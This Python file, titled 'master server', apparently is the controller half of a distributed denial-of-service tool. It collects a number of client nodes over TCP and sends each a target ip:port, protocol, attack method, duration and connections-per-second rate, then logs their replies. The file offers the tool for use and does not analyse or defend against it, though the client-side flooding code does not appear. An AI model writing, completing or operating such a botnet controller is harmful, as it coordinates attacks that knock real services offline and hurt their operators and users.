# master server

import socket
import threading


def handle_client(client_socket, client_name, target_ip, protocol, method, seconds, cps):
    while True:
        if send_data:
            all = f"{target_ip}??<><>{protocol}??<><>{method}??<><>{seconds}??<><>{cps}"
            client_socket.send(all.encode('utf-8'))
            break
    while True:
        recv = client_socket.recv(2048).decode('utf-8')
        if recv == "!!":
            client_socket.close()
            print(f"{client_name} has disconnected")
            break
        print(f"{client_name} sent {recv}")


def create_and_handle_server(target_ip, protocol, method, seconds, cps):
    global send_data
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(("0.0.0.0", server_port))
    server_socket.listen(nodes)

    print(f"Server is listening on 0.0.0.0:{server_port} for {nodes} client(s)")

    for i in range(nodes):
        client_socket, client_address = server_socket.accept()
        client_name = client_socket.recv(1024).decode('utf-8')
        print(f"Connection from {client_address}/{client_name}")

        client_thread = threading.Thread(target=handle_client,
                                         args=(client_socket, client_name, target_ip, protocol, method, seconds, cps))
        client_thread.start()
    send_data = True


print("Enter target ip:port : ")
target_ip = input()
print("Enter protocol: ")
protocol = input()
print("Enter method: ")
method = input()
print("Enter seconds: ")
seconds = input()
print("Enter cps: ")
cps = input()
print("Enter number of clients: ")
nodes = int(input(""))
print("Enter port (must be open and not taken) : ")
server_port = int(input(""))
send_data = False
create_and_handle_server(target_ip, protocol, method, seconds, cps)
